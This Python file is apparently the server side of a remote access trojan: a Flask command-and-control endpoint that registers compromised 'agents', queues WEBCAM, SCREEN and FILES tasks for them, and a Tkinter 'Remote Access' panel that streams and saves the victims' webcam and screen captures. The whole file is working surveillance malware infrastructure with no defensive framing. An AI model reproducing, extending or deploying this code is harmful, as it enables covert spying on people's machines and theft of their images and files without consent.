from flask import Flask, request, jsonify
import threading
import tkinter as tk
import time
import queue
import io
from tkinter import ttk

from PIL import Image, ImageTk
import os as oos


import os as oos


log_queue = queue.Queue()
image_queue = queue.Queue()
agent_windows = {}
streaming_agents = set()
OFFLINE_TIMEOUT = 15
OFFLINE_CHECK_PERIOD = 5
users = []

def get_user(id):
    for user in users:
        if id == user.id: return user
    return False

class Connections:
    def __init__(self, id, ip, os, name):
        self.id = id
        self.ip = ip
        self.os = os
        self.name = name
        self.time_last_seen = time.time()
        self.status = "online"
        self.task_queue = []

    def has_task(self):
        return len(self.task_queue) > 0

    def add_task(self, task):
        self.task_queue.append(task)

    def get_next_task(self):
        if not self.has_task():
            return None

        return self.task_queue.pop(0)
    
    
        
    
    

app = Flask(__name__)


def open_image_window(agent_id, label, img_bytes, task):
    stream_key = f"{agent_id}_{task}"
    if stream_key not in streaming_agents:
        return

    img = Image.open(io.BytesIO(img_bytes))
    img.thumbnail((640, 400))
    photo = ImageTk.PhotoImage(img)

    if stream_key in agent_windows:
        data = agent_windows[stream_key]
        data["img_label"].config(image=photo)
        data["img_label"].image = photo
        data["win"].lift()
        data["win"].after(1000, data["request_next"])
        return

    win = tk.Toplevel(root)
    win.title(f"{label} — {task}")
    win.configure(bg="#0D0D0D")
    win.resizable(False, False)

    img_label = tk.Label(win, image=photo, bg="#0D0D0D")
    img_label.image = photo
    img_label.pack(padx=10, pady=(10, 5))

    def request_next():
        if stream_key not in agent_windows:
            return
        user = get_user(agent_id)
        if user:
            user.add_task(task)

    agent_windows[stream_key] = {"win": win, "img_label": img_label, "request_next": request_next}

    def on_close():
        streaming_agents.discard(stream_key)
        agent_windows.pop(stream_key, None)
        win.destroy()

    win.protocol("WM_DELETE_WINDOW", on_close)

    request_next()


def render():
    global root, console

    root = tk.Tk()
    root.title("Remote Access")
    root.geometry("1200x800")
    root.configure(bg="#0D0D0D")

    console_frame = tk.Frame(root, width=500, bg="#000000")
    console_frame.pack(side="right", fill="y")
    console_frame.pack_propagate(False)

    console_title = tk.Label(
        console_frame,
        text="Console",
        bg="#000000",
        fg="#FFFFFF",
        font=("Menlo", 14, "bold")
    )
    console_title.pack(anchor="w", padx=10, pady=(10, 0))

    console = tk.Text(
        console_frame,
        bg="#000000",
        fg="#FFFFFF",
        font=("Menlo", 11),
        state="disabled",
        bd=0,
        highlightthickness=0,
        relief="flat",
        cursor="arrow"
    )
    console.pack(fill="both", expand=True, padx=10, pady=10)


    active_frame = tk.Frame(root, width=700, bg="#0D0D0D")
    active_frame.pack(side="left", fill="both", expand=True)
    active_frame.pack_propagate(False)

    title = tk.Label(
        active_frame,
        text="Active Connections",
        bg="#0D0D0D",
        fg="#FFFFFF",
        font=("Menlo", 18, "bold")
    )
    title.pack(anchor="w", padx=15, pady=(15, 5))


    style = ttk.Style()
    style.theme_use("clam")
    style.configure("Treeview", background="#0D0D0D", foreground="#FFFFFF", fieldbackground="#0D0D0D", rowheight=28, bordercolor="#444444", borderwidth=1, relief="solid")
    style.configure("Treeview.Heading", background="#111111", foreground="#AAAAAA", relief="flat")
    style.map("Treeview", background=[("selected", "#1E1E1E")], foreground=[("selected", "#FFFFFF")])

    connections_table = ttk.Treeview(
        active_frame,
        columns=("id", "ip", "os", "name", "status"),
        show="headings",
        selectmode="browse",
    )

    connections_table.heading("id", text="ID")
    connections_table.heading("ip", text="IP")
    connections_table.heading("os", text="OS")
    connections_table.heading("name", text="Name")
    connections_table.heading("status", text="Status")

    connections_table.column("id", width=130, anchor="center")
    connections_table.column("ip", width=130, anchor="center")
    connections_table.column("os", width=100, anchor="center")
    connections_table.column("name", width=190, anchor="center")
    connections_table.column("status", width=100, anchor="center")

    connections_table.tag_configure("online", foreground="#00FF88")
    connections_table.tag_configure("offline", foreground="#FF4444")

    connections_table.pack(fill="both", expand=True, padx=15, pady=10)

    # =========================
    # Actions
    # =========================
    actions_frame = tk.Frame(active_frame, bg="#0D0D0D")
    actions_frame.pack(side="bottom", pady=(0, 15))

    def get_selected_agent_id():
        selected = connections_table.selection()

        if not selected:
            log("[-] No agent selected")
            return None


        return selected[0]

    def send_ui_task(task_name):
        agent_id = get_selected_agent_id()

        if not agent_id:
            return

        allowed_tasks = {
            "WEBCAM": "WEBCAM",
            "SCREEN": "SCREEN",
            "FILES": "FILES"
        }

        if task_name not in allowed_tasks:
            log(f"[-] Unknown task: {task_name}")
            return

        task = allowed_tasks[task_name]

        if task in ("SCREEN", "WEBCAM"):
            streaming_agents.add(f"{agent_id}_{task}")

        get_user(agent_id).add_task(task)
        log(f"[*] {task} for {get_user(agent_id).ip} queued")
        
        

    webcam_btn = tk.Button(
        actions_frame,
        text="WEBCAM",
        command=lambda: send_ui_task("WEBCAM"),
        bg="#000000",
        fg="#FFAA00",
        activebackground="#222222",
        activeforeground="#FFAA00",
        relief="flat",
        highlightthickness=0,
        highlightbackground="#000000",
        padx=15,
        pady=6
    )
    webcam_btn.pack(side="left", padx=(0, 8))

    screen_btn = tk.Button(
        actions_frame,
        text="SCREEN",
        command=lambda: send_ui_task("SCREEN"),
        bg="#000000",
        fg="#FFAA00",
        activebackground="#222222",
        activeforeground="#FFAA00",
        relief="flat",
        highlightthickness=0,
        highlightbackground="#000000",
        padx=15,
        pady=6
    )
    screen_btn.pack(side="left", padx=8)

    file_btn = tk.Button(
        actions_frame,
        text="FILE",
        command=lambda: send_ui_task("FILES"),
        bg="#000000",
        fg="#FFAA00",
        activebackground="#222222",
        activeforeground="#FFAA00",
        relief="flat",
        highlightthickness=0,
        highlightbackground="#000000",
        padx=15,
        pady=6
    )
    file_btn.pack(side="left", padx=8)


    def update_connections_list():
        selected = connections_table.selection()
        selected_id = selected[0] if selected else None

        for item in connections_table.get_children():
            connections_table.delete(item)

        for user in users:
            status_tag = "online" if user.status == "online" else "offline"

            connections_table.insert(
                "",
                "end",
                iid=user.id,
                values=(
                    user.id,
                    user.ip,
                    user.os,
                    user.name,
                    user.status
                ),
                tags=(status_tag,)
            )

        if selected_id and connections_table.exists(selected_id):
            connections_table.selection_set(selected_id)
            connections_table.focus(selected_id)

        root.after(1000, update_connections_list)


    def update_console():
        while not log_queue.empty():
            message = log_queue.get()

            console.config(state="normal")
            console.insert("end", message + "\n")
            console.see("end")
            console.config(state="disabled")

        root.after(300, update_console)

    def check_image_queue():
        while not image_queue.empty():
            agent_id, label, img_bytes, task = image_queue.get()
            open_image_window(agent_id, label, img_bytes, task)
        root.after(500, check_image_queue)

    update_connections_list()
    update_console()
    check_image_queue()

    root.mainloop()
def log(message):
    print(message)
    log_queue.put(message)

    
    
def add_user(id,ip,os,name):
    new_user = Connections(id,ip,os,name)
    users.append(new_user)
    log(f"\n[+] New connection from {request.remote_addr}")
    log(f"INFO:\n-> ID : {new_user.id}\n-> IP : {new_user.ip}\n-> OS : {new_user.os}\n-> NAME : {new_user.name}\n")
    get_user(id).time_last_seen = time.time()
        
    
@app.route("/info", methods=["POST"])
def get_info():
    data = request.get_json()
    
    try: 
        id = data.get("id")
        os = data.get("os")
        name = data.get("name")
    except ValueError as e:
        log("[-] Fetching connection error: {e}")  
    if get_user(id) == False: 
        add_user(id,request.remote_addr,os,name)
    else:
        log(f"[+] {get_user(id).ip} connected")
        get_user(id).time_last_seen = time.time()
    return "OK"



@app.route("/tasks", methods=["POST"])
def task_check():
    data = request.get_json()

    if not data:
        return jsonify({"error": "JSON"}), 400

    id = data.get("id")
    endpoint = get_user(id)

    if endpoint == False:
        log(f"[*] Verifying connection from {request.remote_addr}")
        return jsonify({"task": "WHO"}), 400

    endpoint.time_last_seen = time.time()
    endpoint.status = "online"

    if endpoint.has_task():
        task = endpoint.get_next_task()
        return jsonify({"task": task})

    return jsonify({"task": "NONE"})
    
@app.route("/screen", methods=["POST"])
def screen():
    id = request.form.get("id")
    file = request.files.get("file")

    if not file or not id:
        return jsonify({"error": "missing data"}), 400

    img_bytes = file.read()

    user = get_user(id)
    label = user.name if user else request.remote_addr

    oos.makedirs("screens", exist_ok=True)
    with open(f"screens/{request.remote_addr}_{time.time()}.png", "wb") as f:
        f.write(img_bytes)

    image_queue.put((id, label, img_bytes, "SCREEN"))
    log(f"    > Frame received from {request.remote_addr}")
    return "OK"


def handling_inactive_connections(connections):
    while True:
        for con in connections:
            if time.time() - con.time_last_seen >= OFFLINE_TIMEOUT: con.status="offline"
            else: con.status = "online"
        time.sleep(OFFLINE_CHECK_PERIOD)
        

@app.route("/webcam", methods=["POST"])
def receive_webcam():
    agent_id = request.form.get("id")
    file = request.files.get("file")
    if not file or not agent_id:
        return jsonify({"error": "missing data"}), 400
    img_bytes = file.read()
    user = get_user(agent_id)
    label = user.name if user else request.remote_addr
    oos.makedirs("webcams", exist_ok=True)
    with open(f"webcams/{agent_id}_{time.time()}.png", "wb") as f:
        f.write(img_bytes)
    image_queue.put((agent_id, label, img_bytes, "WEBCAM"))
    log(f"    -> Webcam frame received from {request.remote_addr}")
    return "OK"
    

def run_server():
    app.run(host="0.0.0.0", debug=True, use_reloader=False)



if __name__ == "__main__":
    checker_thread = threading.Thread(
        target=handling_inactive_connections,
        args=(users,),
        daemon=True
    )

    server_thread = threading.Thread(
        target=run_server,
        daemon=True
    )

    checker_thread.start()
    server_thread.start()

    render()